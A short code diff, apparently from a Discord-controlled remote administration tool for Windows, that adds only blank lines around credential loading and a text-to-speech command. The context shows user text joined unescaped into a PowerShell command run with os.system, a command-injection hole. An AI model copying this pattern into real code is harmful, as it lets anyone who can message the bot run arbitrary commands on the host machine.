@@ -22,9 +22,11 @@ client = Bot(description="A remote administration tool for discord", command_pre
 
 # Enter Discord Bot Token & Channel ID:
 import local_credentials as LocalCredentials
+
 #Create a local_credentials (added to .gitignore) file with the very same variables so there is no risk to commit credentials by mistake
 BOT_TOKEN = LocalCredentials.BOT_TOKEN
 CHANNEL_ID = LocalCredentials.CHANNEL_ID
+
 
 @client.event
 async def on_ready():
@@ -163,6 +165,7 @@ async def say(txt):
 	await client.say("Saying: " + txt)
 	os.system("powershell Add-Type -AssemblyName System.Speech; $synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('" + txt + "')")
 	await asyncio.sleep(3)
+
 
 # Module: media
 # Description: Controls Media Features
